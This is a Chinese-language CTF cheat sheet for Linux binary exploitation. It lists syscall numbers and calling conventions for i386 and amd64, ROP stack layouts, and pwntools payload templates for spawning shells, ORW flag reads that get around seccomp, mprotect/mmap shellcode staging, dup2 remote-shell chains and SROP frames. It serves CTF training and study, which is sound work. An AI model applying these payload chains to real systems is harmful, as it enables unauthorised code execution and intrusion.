---
title: "PWN 常用系统调用速查"
lastmod: 2026-04-20T21:20:49+08:00
draft: false
---
这份笔记主要面向 Linux PWN 里的 `ret2syscall`、SROP、ORW、沙箱绕过和 shellcode 编写。默认讨论 `i386` 和 `amd64` 两种最常见架构。

## 1. 系统调用约定

### amd64

64 位 Linux 用 `syscall` 指令进入内核。

```text
rax = 系统调用号
rdi = 第 1 个参数
rsi = 第 2 个参数
rdx = 第 3 个参数
r10 = 第 4 个参数
r8  = 第 5 个参数
r9  = 第 6 个参数
```

常见 ROP 需要找：

```text
pop rax; ret
pop rdi; ret
pop rsi; ret
pop rdx; ret
syscall; ret
```

如果没有单独的 `pop rdx; ret`，可以找组合 gadget，比如：

```text
pop rdx; pop rsi; ret
pop rsi; pop r15; ret
```

### i386

32 位 Linux 常用 `int 0x80` 进入内核。

```text
eax = 系统调用号
ebx = 第 1 个参数
ecx = 第 2 个参数
edx = 第 3 个参数
esi = 第 4 个参数
edi = 第 5 个参数
ebp = 第 6 个参数
```

常见 ROP 需要找：

```text
pop eax; ret
pop ebx; ret
pop ecx; ret
pop edx; ret
int 0x80
```

静态链接程序经常能找到组合 gadget，比如：

```text
pop edx; pop ecx; pop ebx; ret
```

使用组合 gadget 时，栈上参数顺序必须和 gadget 的 `pop` 顺序一致。

## 2. 最常用系统调用号

| 功能 | amd64 syscall | i386 syscall |
| --- | ---: | ---: |
| `read` | `0` | `3` |
| `write` | `1` | `4` |
| `open` | `2` | `5` |
| `close` | `3` | `6` |
| `mmap` | `9` | `90` |
| `mprotect` | `10` | `125` |
| `munmap` | `11` | `91` |
| `brk` | `12` | `45` |
| `rt_sigreturn` | `15` | `173` |
| `dup2` | `33` | `63` |
| `execve` | `59` | `11` |
| `exit` | `60` | `1` |
| `openat` | `257` | `295` |

补充：

1. i386 上老式 socket 相关调用常通过 `socketcall = 102` 分发，例如 `socket/connect/send/recv` 都走同一个 syscall，再用第一个参数指定子功能。
2. amd64 上 socket 相关调用通常是独立 syscall，比如 `socket = 41`、`connect = 42`、`accept = 43`、`sendto = 44`、`recvfrom = 45`。
3. 做 seccomp 题时一定以 `seccomp-tools dump ./pwn` 或题目实际过滤规则为准。

### 常用 PLT 函数调用栈格式

下面这种写法主要是 `i386` 下通过 PLT 调 libc 函数时的栈格式，也就是常见的 `ret2plt` / `ret2libc` 链：

```text
[函数@plt]
[清理参数 gadget / 返回地址]
[第 1 个参数]
[第 2 个参数]
[第 3 个参数]
...
```

参数个数不同，需要的清理 gadget 也不同：

```text
1 个参数 -> pop ret
2 个参数 -> pop pop ret
3 个参数 -> pop pop pop ret
4 个参数 -> pop pop pop pop ret
6 个参数 -> pop pop pop pop pop pop ret
```

如果这个函数是 ROP 链最后一步，`[清理参数 gadget]` 可以直接放一个安全返回地址，例如 `main`、`exit@plt` 或下一段 ROP 的地址。  
如果后面还要继续接函数，参数后面继续放下一段 ROP 地址，清理 gadget 执行完 `ret` 后会跳过去。

#### 输入输出类

`read(fd, buf, size)`

```text
[read@plt]
[清理参数 gadget]
[fd]
[buf]
[size]
```

常用例子：

```text
[read@plt]
[pop pop pop ret]
[0]
[bss]
[0x100]
[下一段 ROP]
```

`write(fd, buf, size)`

```text
[write@plt]
[清理参数 gadget]
[fd]
[buf]
[size]
```

常用例子：

```text
[write@plt]
[pop pop pop ret]
[1]
[write_got]
[4]
[main / 下一段 ROP]
```

`puts(s)`

```text
[puts@plt]
[清理参数 gadget]
[s]
```

常用例子：

```text
[puts@plt]
[pop ret]
[puts_got]
[main]
```

`printf(format, ...)`

```text
[printf@plt]
[清理参数 gadget]
[format]
[可选参数 1]
[可选参数 2]
...
```

如果只是 `printf(format)`，只需要清理 1 个参数；如果是 `printf("%s", addr)`，需要清理 2 个参数。

`scanf(format, ...)`

```text
[scanf@plt]
[清理参数 gadget]
[format]
[buf / 变量地址]
[可选参数 ...]
```

`gets(buf)`

```text
[gets@plt]
[清理参数 gadget]
[buf]
```

`fgets(buf, size, stream)`

```text
[fgets@plt]
[清理参数 gadget]
[buf]
[size]
[stream]
```

`send(sockfd, buf, len, flags)`

```text
[send@plt]
[清理参数 gadget]
[sockfd]
[buf]
[len]
[flags]
```

`recv(sockfd, buf, len, flags)`

```text
[recv@plt]
[清理参数 gadget]
[sockfd]
[buf]
[len]
[flags]
```

#### 文件类

`open(path, flags, mode)`

```text
[open@plt]
[清理参数 gadget]
[path]
[flags]
[mode]
```

常用读文件：

```text
[open@plt]
[pop pop pop ret]
[flag_addr]
[0]
[0]
[下一段 ROP]
```

`openat(dirfd, path, flags, mode)`

```text
[openat@plt]
[清理参数 gadget]
[dirfd]
[path]
[flags]
[mode]
```

常用例子：

```text
[openat@plt]
[pop pop pop pop ret]
[-100]
[flag_addr]
[0]
[0]
[下一段 ROP]
```

`close(fd)`

```text
[close@plt]
[清理参数 gadget]
[fd]
```

#### 执行命令类

`system(command)`

```text
[system@plt]
[返回地址]
[command]
```

常用例子：

```text
[system@plt]
[exit@plt / main]
[/bin/sh 地址]
```

`execve(path, argv, envp)`

```text
[execve@plt]
[清理参数 gadget]
[path]
[argv]
[envp]
```

常用例子：

```text
[execve@plt]
[pop pop pop ret]
[/bin/sh 地址]
[0]
[0]
[exit@plt]
```

`exit(status)`

```text
[exit@plt]
[返回地址可随便填]
[status]
```

`exit` 正常不会返回，所以返回地址一般不重要。

#### 内存权限和内存操作类

`mprotect(addr, len, prot)`

```text
[mprotect@plt]
[清理参数 gadget]
[addr]
[len]
[prot]
```

常用例子：

```text
[mprotect@plt]
[pop pop pop ret]
[page_start]
[0x1000]
[7]
[shellcode_addr]
```

`mmap(addr, length, prot, flags, fd, offset)`

```text
[mmap@plt]
[清理参数 gadget]
[addr]
[length]
[prot]
[flags]
[fd]
[offset]
```

常用例子：

```text
[mmap@plt]
[pop pop pop pop pop pop ret]
[0]
[0x1000]
[7]
[0x22]
[-1]
[0]
[下一段 ROP]
```

`memset(dest, value, n)`

```text
[memset@plt]
[清理参数 gadget]
[dest]
[value]
[n]
```

`memcpy(dest, src, n)`

```text
[memcpy@plt]
[清理参数 gadget]
[dest]
[src]
[n]
```

`strcpy(dest, src)`

```text
[strcpy@plt]
[清理参数 gadget]
[dest]
[src]
```

`strlen(s)`

```text
[strlen@plt]
[清理参数 gadget]
[s]
```

#### socket 类

`socket(domain, type, protocol)`

```text
[socket@plt]
[清理参数 gadget]
[domain]
[type]
[protocol]
```

常用 TCP：

```text
[socket@plt]
[pop pop pop ret]
[2]
[1]
[0]
[下一段 ROP]
```

`connect(sockfd, addr, addrlen)`

```text
[connect@plt]
[清理参数 gadget]
[sockfd]
[addr]
[addrlen]
```

`accept(sockfd, addr, addrlen_ptr)`

```text
[accept@plt]
[清理参数 gadget]
[sockfd]
[addr]
[addrlen_ptr]
```

`bind(sockfd, addr, addrlen)`

```text
[bind@plt]
[清理参数 gadget]
[sockfd]
[addr]
[addrlen]
```

`listen(sockfd, backlog)`

```text
[listen@plt]
[清理参数 gadget]
[sockfd]
[backlog]
```

`dup2(oldfd, newfd)`

```text
[dup2@plt]
[清理参数 gadget]
[oldfd]
[newfd]
```

常用远程 shell：

```text
[dup2@plt]
[pop pop ret]
[sockfd]
[0]
[dup2@plt]
[pop pop ret]
[sockfd]
[1]
[dup2@plt]
[pop pop ret]
[sockfd]
[2]
[system@plt]
[exit@plt]
[/bin/sh 地址]
```

#### amd64 PLT 调用提醒

`amd64` 下函数参数不是按上面那种方式压在栈上，而是走寄存器：

```text
rdi = 第 1 个参数
rsi = 第 2 个参数
rdx = 第 3 个参数
rcx = 第 4 个参数
r8  = 第 5 个参数
r9  = 第 6 个参数
```

所以 `amd64` 调 `read@plt` 更像这样：

```text
[pop rdi; ret]
[fd]
[pop rsi; ret]
[buf]
[pop rdx; ret]
[size]
[read@plt]
[下一段 ROP]
```

注意：`amd64 syscall` 的第 4 个参数用 `r10`，但普通 libc/PLT 函数调用的第 4 个参数用 `rcx`。

## 3. execve 拿 shell

目标：

```c
execve("/bin/sh", 0, 0)
```

### amd64 构造

```text
rax = 59
rdi = "/bin/sh" 地址
rsi = 0
rdx = 0
rip = syscall; ret
```

ROP 结构：

```python
payload = b"A" * offset
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall_ret)
```

### i386 构造

```text
eax = 11
ebx = "/bin/sh" 地址
ecx = 0
edx = 0
eip = int 0x80
```

ROP 结构：

```python
payload = b"A" * offset
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_edx_ecx_ebx)
payload += p32(0)       # edx
payload += p32(0)       # ecx
payload += p32(binsh)   # ebx
payload += p32(int_80)
```

如果程序里没有 `/bin/sh`，可以先 `read(0, bss, 8)` 把字符串写到 `.bss`。

## 4. read 写入数据

目标：

```c
read(0, buf, size)
```

用途：

1. 把 `/bin/sh\x00` 写进 `.bss`。
2. 写第二阶段 ROP 链。
3. 写 shellcode。
4. 写伪造的 `ret2dlresolve` 结构。

### amd64 构造

```text
rax = 0
rdi = 0
rsi = buf
rdx = size
rip = syscall; ret
```

### i386 构造

```text
eax = 3
ebx = 0
ecx = buf
edx = size
eip = int 0x80
```

## 5. write 泄露数据

目标：

```c
write(1, addr, size)
```

用途：

1. 泄露 GOT 表中的 libc 地址。
2. 泄露程序内存，BROP/dump binary 常用。
3. ORW 读 flag 后输出内容。

### amd64 构造

```text
rax = 1
rdi = 1
rsi = addr
rdx = size
rip = syscall; ret
```

### i386 构造

```text
eax = 4
ebx = 1
ecx = addr
edx = size
eip = int 0x80
```

## 6. ORW 读 flag

有些题禁用 `execve`，但允许 `open/read/write`，这时用 ORW。

目标：

```c
fd = open("flag", 0)
read(fd, buf, 0x100)
write(1, buf, 0x100)
```

### amd64 open/read/write

```text
open("flag", 0, 0)
rax = 2
rdi = flag_addr
rsi = 0
rdx = 0
syscall

read(fd, buf, 0x100)
rax = 0
rdi = fd
rsi = buf
rdx = 0x100
syscall

write(1, buf, 0x100)
rax = 1
rdi = 1
rsi = buf
rdx = 0x100
syscall
```

### amd64 openat/read/write

如果 seccomp 禁了 `open`，但没禁 `openat`，可以用：

```c
openat(AT_FDCWD, "flag", 0, 0)
```

```text
rax = 257
rdi = -100        # AT_FDCWD
rsi = flag_addr
rdx = 0
r10 = 0
syscall
```

`AT_FDCWD = -100`，写成 64 位无符号就是：

```python
p64(0xffffffffffffff9c)
```

### i386 open/read/write

```text
open("flag", 0, 0)
eax = 5
ebx = flag_addr
ecx = 0
edx = 0
int 0x80

read(fd, buf, 0x100)
eax = 3
ebx = fd
ecx = buf
edx = 0x100
int 0x80

write(1, buf, 0x100)
eax = 4
ebx = 1
ecx = buf
edx = 0x100
int 0x80
```

注意：`open` 返回的 fd 一般是 `3`，但更稳的写法是用 shellcode 或 SROP 保存返回值。如果 ROP 很受限，CTF 题里常常直接假设 fd 为 `3`。

## 7. mprotect 改权限

目标：

```c
mprotect(page_start, length, 7)
```

用途：把栈、`.bss` 或某段内存改成可读可写可执行，然后跳 shellcode。

权限：

```text
PROT_READ  = 1
PROT_WRITE = 2
PROT_EXEC  = 4
RWX = 7
```

地址必须页对齐，通常按 `0x1000` 对齐：

```python
page = target_addr & ~0xfff
```

### amd64 构造

```text
rax = 10
rdi = page_start
rsi = 0x1000
rdx = 7
rip = syscall; ret
```

### i386 构造

```text
eax = 125
ebx = page_start
ecx = 0x1000
edx = 7
eip = int 0x80
```

## 8. mmap 申请可执行内存

目标：

```c
mmap(addr, length, prot, flags, fd, offset)
```

常用：

```c
mmap(0, 0x1000, 7, 0x22, -1, 0)
```

其中：

```text
prot = 7              # RWX
flags = 0x22          # MAP_PRIVATE | MAP_ANONYMOUS
fd = -1
offset = 0
```

### amd64 构造

```text
rax = 9
rdi = 0
rsi = 0x1000
rdx = 7
r10 = 0x22
r8  = -1
r9  = 0
syscall
```

`mmap` 参数比较多，所以 amd64 需要能控制 `r10/r8/r9`，比 `mprotect` 更挑 gadget。

### i386 构造

i386 老接口 `mmap = 90` 通常参数通过结构体指针传入；很多环境也有 `mmap2 = 192`。普通入门题里更常用 `mprotect`，因为参数更少、更好构造。

## 9. dup2 重定向

目标：

```c
dup2(sock, 0)
dup2(sock, 1)
dup2(sock, 2)
```

用途：远程 shell 或 socket shellcode 中，把 socket fd 重定向到标准输入、输出、错误。

### amd64 构造

```text
rax = 33
rdi = sockfd
rsi = 0 / 1 / 2
syscall
```

### i386 构造

```text
eax = 63
ebx = sockfd
ecx = 0 / 1 / 2
int 0x80
```

## 10. SROP 常构造内容

SROP 的关键不是一个个 `pop`，而是伪造信号帧。

amd64 执行 `execve("/bin/sh", 0, 0)` 的 frame：

```python
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
```

如果要 ORW，也可以把 frame 设置成 `open/read/write` 对应寄存器。触发 `rt_sigreturn` 后，内核会按 frame 恢复寄存器并跳到 `frame.rip`。

amd64 的 `rt_sigreturn` syscall 号是：

```text
15
```

i386 的 `rt_sigreturn` syscall 号常见是：

```text
173
```

## 11. pwntools 写法

### 直接查系统调用号

```python
from pwn import *

context.arch = "amd64"
print(constants.SYS_execve)  # 59

context.arch = "i386"
print(constants.SYS_execve)  # 11
```

### 生成 shellcode

```python
context.arch = "amd64"
sc = asm(shellcraft.sh())

context.arch = "i386"
sc = asm(shellcraft.sh())
```

### ORW shellcode

```python
context.arch = "amd64"
sc = shellcraft.open("flag")
sc += shellcraft.read("rax", "rsp", 0x100)
sc += shellcraft.write(1, "rsp", 0x100)
sc = asm(sc)
```

## 12. 做题时怎么选

能执行 shellcode：

```text
NX 关闭 -> shellcode / ret2esp / ret2reg
```

不能执行 shellcode，但能 syscall：

```text
静态链接或有 syscall gadget -> ret2syscall
```

有 libc 泄露：

```text
ret2libc -> system("/bin/sh") 或 one_gadget
```

禁了 `execve`：

```text
ORW -> open/openat + read + write
```

没有足够 pop gadget：

```text
ret2csu / SROP / 栈迁移
```

栈上空间不够：

```text
read 写第二阶段到 .bss -> leave; ret 栈迁移
```

## 13. 常见坑

1. `strings -a -t x` 输出的是文件偏移，不一定是运行时虚拟地址。非 PIE 常见要结合 `readelf -l` 的 LOAD 段换算，或者直接用 `next(elf.search(b"/bin/sh"))`。
2. 32 位和 64 位 syscall 号不同，`read` 在 amd64 是 `0`，i386 是 `3`。
3. 32 位 `int 0x80` 的参数是 `ebx/ecx/edx`，64 位 `syscall` 的参数是 `rdi/rsi/rdx`。
4. amd64 调 `system` 崩溃时，先考虑栈 16 字节对齐，补一个 `ret`。
5. `mprotect` 的地址要页对齐。
6. `openat` 的 `AT_FDCWD` 是 `-100`。
7. seccomp 题不能只背 syscall 表，要看实际允许哪些 syscall。

